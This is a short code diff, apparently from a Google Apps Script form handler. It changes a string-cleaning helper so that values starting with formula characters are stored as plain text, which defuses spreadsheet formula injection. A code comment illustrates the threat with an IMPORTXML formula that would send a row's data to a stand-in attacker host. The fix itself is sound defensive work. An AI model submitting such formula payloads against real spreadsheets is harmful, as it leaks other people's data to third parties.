@@ -208,8 +208,20 @@ function json(obj) {
     .setMimeType(ContentService.MimeType.JSON);
 }
 
+/**
+ * Trim to a string, and defuse spreadsheet formula injection.
+ *
+ * Sheets evaluates any cell whose text begins with = + - @ (or a leading tab /
+ * carriage return) as a formula, so a submitted value like
+ *   =IMPORTXML("https://evil.example/?d="&A2, "//a")
+ * would run when someone opens the Sheet and leak that row to a third party.
+ * Prefixing with an apostrophe forces Sheets to store it as literal text; the
+ * apostrophe is a storage marker and is not displayed in the cell.
+ */
 function str(v) {
-  return v == null ? '' : String(v).trim();
+  var out = v == null ? '' : String(v).trim();
+  if (out && /^[=+\-@\t\r]/.test(out)) out = "'" + out;
+  return out;
 }
 
 function or_(v, fallback) {
